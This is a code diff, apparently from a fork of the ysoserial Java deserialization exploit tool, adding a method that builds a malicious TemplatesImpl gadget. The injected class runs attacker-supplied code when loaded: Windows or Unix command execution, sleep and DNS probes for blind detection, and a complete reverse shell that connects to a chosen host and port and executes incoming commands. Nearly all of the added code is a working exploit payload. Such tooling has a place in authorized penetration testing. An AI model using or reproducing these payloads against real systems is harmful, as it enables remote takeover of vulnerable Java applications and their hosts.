@@ -80,7 +80,105 @@ public class Gadgets {
         map.put(key, val);
         return map;
     }
+    public static <T> T createTemplatesImpl ( final String command, final String attackType, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+        throws Exception {
+        final T templates = tplClass.newInstance();
 
+        // use template gadget class
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
+        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+
+        // default ysoserial exec global
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+            "\");";
+
+        // federicodotta - EXEC with args win
+        if(attackType.equals("exec_win")) {
+
+            cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"cmd\",\"/C\",\"" + command.replaceAll("\"", "\\\"") + "\"});";
+
+            // federicodotta - EXEC with unix
+        } else if(attackType.equals("exec_unix")) {
+
+            cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"" + command.replaceAll("\"", "\\\"") + "\"});";
+
+            // federicodotta - Java native sleep
+        } else if(attackType.equals("sleep")) {
+
+            long timeToSleep = Long.parseLong(command);
+            cmd = "java.lang.Thread.sleep((long)" + timeToSleep + ");";
+
+            // federicodotta - Java native DNS resolution
+        } else if(attackType.equals("dns")) {
+
+            cmd = "java.net.InetAddress.getByName(\"" + command + "\");";
+
+            // NickstaDB - Reverse shell
+        } else if(attackType.equals("java_reverse_shell")) {
+
+            if(command.split(":").length != 2) {
+                throw new IllegalArgumentException("Connect back command format is <host>:<port> (got " + command + ")");
+            }
+            String host = command.split(":")[0];
+            int port;
+            try {
+                port = Integer.parseInt(command.split(":")[1]);
+            } catch(NumberFormatException nfe) {
+                throw new IllegalArgumentException("Invalid port specified for connect back command (" + command.split(":")[2] + ")");
+            }
+            if(port < 1 || port > 65535) {
+                throw new IllegalArgumentException("Invalid port specified for connect back command (" + port + ")");
+            }
+            cmd = "java.net.Socket sck=null;java.io.OutputStream out;java.io.BufferedReader rdr;Process proc;String cmd=\"\";String " +
+                "os=System.getProperty(\"os.name\").toLowerCase(java.util.Locale.ENGLISH);try{sck=new java.net.Socket(java.net.Inet" +
+                "Address.getByName(\"" + host + "\")," + port + ");out=sck.getOutputStream();rdr=new java.io.BufferedReader(new java" +
+                ".io.InputStreamReader(sck.getInputStream()));while(cmd.trim().toLowerCase(java.util.Locale.ENGLISH).equals(\"exit\")" +
+                "==false){try{out.write(\"> \".getBytes(),0,\"> \".getBytes().length);cmd=rdr.readLine();if(cmd.trim().toLowerCase(" +
+                "java.util.Locale.ENGLISH).equals(\"exit\")==false){if(os.contains(\"win\")){proc=new ProcessBuilder(new String[]{\"cmd\",\"/c\",\"" +
+                "\\\"\"+cmd.trim()+\"\\\"\"}).redirectErrorStream(true).start();}else{try{proc=new ProcessBuilder(new String[]{\"/bin/bash\",\"-c\"," +
+                "cmd.trim()}).redirectErrorStream(true).start();}catch(java.io.IOException ioe){if(ioe.getMessage().contains(\"Cannot " +
+                "run program\")){try{proc=new ProcessBuilder(new String[]{\"/bin/sh\",\"-c\",cmd.trim()}).redirectErrorStream(true).start();}catch(" +
+                "java.io.IOException ioe2){if(ioe2.getMessage().contains(\"Cannot run program\")){throw new java.io.IOException(\"Non-" +
+                "Windows target and neither /bin/bash or /bin/sh is present.\");}else{throw ioe2;}}}else{throw ioe;}}}proc.waitFor();" +
+                "byte[] b=new byte[proc.getInputStream().available()];proc.getInputStream().read(b);out.write(b);}}catch(Exception ex" +
+                "){out.write((\"[-] Exception: \"+ex.toString()).getBytes());}}sck.close();}catch(Exception ex){if(sck!=null){try{sck" +
+                ".close();}catch(Exception ex2){}}}";
+
+        }
+
+        clazz.makeClassInitializer().insertAfter(cmd);
+        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+        clazz.setName("ysoserial.Pwner" + System.nanoTime());
+        CtClass superC = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superC);
+
+        final byte[] classBytes = clazz.toBytecode();
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+            classBytes, ClassFiles.classAsBytes(Foo.class)
+        });
+
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        return templates;
+    }
+    public static Object createTemplatesImpl ( final String command, final String attackType ) throws Exception {
+        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
+            return createTemplatesImpl(
+                command,
+                attackType,
+                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
+                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
+                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+        }
+
+        return createTemplatesImpl(command, attackType, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+    }
     public static Object createTemplatesImpl(String command) throws Exception {
         command = command.trim();
         Class tplClass;
